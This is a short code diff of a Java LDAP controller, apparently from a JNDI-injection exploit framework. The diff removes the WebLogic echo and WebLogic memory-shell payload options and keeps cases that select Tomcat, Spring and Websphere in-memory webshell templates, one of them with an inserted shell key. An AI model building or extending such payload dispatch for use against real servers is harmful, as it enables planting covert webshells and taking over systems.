@@ -5,8 +5,6 @@ import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
 import com.nu1r.jndi.gadgets.utils.Utils;
 import com.nu1r.jndi.template.*;
-import com.nu1r.jndi.template.Weblogic.WeblogicMemshellTemplate1;
-import com.nu1r.jndi.template.Weblogic.WeblogicMemshellTemplate2;
 import com.nu1r.jndi.template.Websphere.WebsphereMemshellTemplate;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
 import com.nu1r.jndi.utils.Config;
@@ -60,9 +58,6 @@ public class BasicController implements LdapController {
                 break;
             case springecho:
                 className = SpringEchoTemplate.class.getName();
-                break;
-            case weblogicecho:
-                className = WeblogicEchoTemplate.class.getName();
                 break;
             case tomcatfilterjmx:
                 className = "TFMSFromJMXF";
@@ -127,12 +122,6 @@ public class BasicController implements LdapController {
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
                 className = ctClass.getName();
-                break;
-            case weblogicmemshell1:
-                className = WeblogicMemshellTemplate1.class.getName();
-                break;
-            case weblogicmemshell2:
-                className = WeblogicMemshellTemplate2.class.getName();
                 break;
             case webspherememshell:
                 className = WebsphereMemshellTemplate.class.getName();
